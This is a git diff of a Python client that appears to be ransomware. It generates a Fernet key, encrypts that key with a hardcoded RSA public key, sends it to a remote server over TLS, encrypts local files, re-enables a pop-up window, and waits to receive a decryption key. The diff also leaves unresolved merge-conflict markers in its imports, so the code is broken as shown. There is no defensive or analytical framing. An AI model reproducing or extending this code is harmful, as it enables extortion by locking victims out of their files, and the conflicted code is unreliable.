@@ -1,4 +1,4 @@
-from email import message
+
 import os
 from pathlib import Path
 from cryptography.fernet import Fernet
@@ -9,8 +9,12 @@ import sys
 from threading import *
 import uuid
 import time
+<<<<<<< HEAD
+import interface
+=======
 from Crypto.PublicKey import RSA
 from Crypto.Cipher import PKCS1_OAEP
+>>>>>>> a06d80b674f9a7f78bbb7890dd6b5d526bd7a687
 
 #import interface
 
@@ -131,13 +135,15 @@ if __name__ == "__main__":
     context.load_verify_locations(os.path.join("crypto", "cert.pem"))
 
     # generate fernet key
-    key = Fernet.generate_key()   
+    key = Fernet.generate_key()
 
     pubKey = RSA.import_key(b'-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA3O2lkNYVKaUsOvEbXUoN\nJGJqBOmOMhaGsnvxhp0y4kFoY6gVDUpXtfcLejVEeaHttvudCUIN04ll1CLsuhlW\nShBSYC/H/zq0As07Ura4PEyzldZmoFBaQcsZMh3oZbypk8avwrHLJDHCMusWJlB2\ndj1VRwdnrd4/kSAQLDBXHvVsfcb2jIOKITHIj45GTb2yNCTk5af46gK3loMksxQx\nBdhjtbhXCaDpjaUIZtW41tALssh2sZOdY8M+qd2eL8cJ+lZGpTsU8/r9S90JLxnx\nxbzQdkP8AsEH01HRhYVtMzEzMB3qdkoqfl2KLMzGrXj9oIZrWUI2riMBd+wSIBx7\nPwIDAQAB\n-----END PUBLIC KEY-----')
     encryptor = PKCS1_OAEP.new(pubKey)
     encrypted = encryptor.encrypt(key)
-    print(encrypted)
-    PACKAGE = MESSAGE + ' ' + encrypted
+
+    encrypted = int.from_bytes(encrypted, "little")
+
+    PACKAGE = MESSAGE + " " + str(encrypted)
 
     # set up our socket to connect to the server
     s = socket.create_connection((HOST, PORT))
@@ -165,9 +171,9 @@ if __name__ == "__main__":
                         print("encrypting")
                         encryptFiles(key)
                     # set up thread for tkinter window
-                    #t1 = Thread(target=interface.App().pop_up_win)
-                    #t1.daemon = True
-                    #t1.start()
+                    t1 = Thread(target=interface.App().pop_up_win)
+                    t1.daemon = True
+                    t1.start()
 
                     # recv waits for new input of key to decrypt
                     key = secSock.recv(4096)
